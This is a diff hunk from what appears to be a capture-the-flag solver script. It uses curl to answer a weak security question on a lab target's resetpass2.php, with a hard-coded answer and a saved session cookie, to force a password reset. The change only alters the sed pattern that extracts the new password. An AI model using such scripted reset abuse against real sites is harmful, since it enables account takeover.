@@ -24,4 +24,4 @@ curl -s -X POST "http://$target_ip:85/resetpass1.php" -b /work/cookie-id.txt -L 
 # Answering too easy security question
 echo "3 - ANSWERING SECURITY QUESTION"
 curl -s -X POST "http://$target_ip:85/resetpass2.php" -b /work/cookie-id.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "q=2" -d "a=green" > /work/password.html
-echo "--> New password ix : $(sed -n 's/.*to\(.*{.*}\)<\/p>.*/\1/p' /work/password.html)"
+echo "--> New password ix : $(sed -n 's/.*to\(.*\)<\/p>.*/\1/p' /work/password.html)"
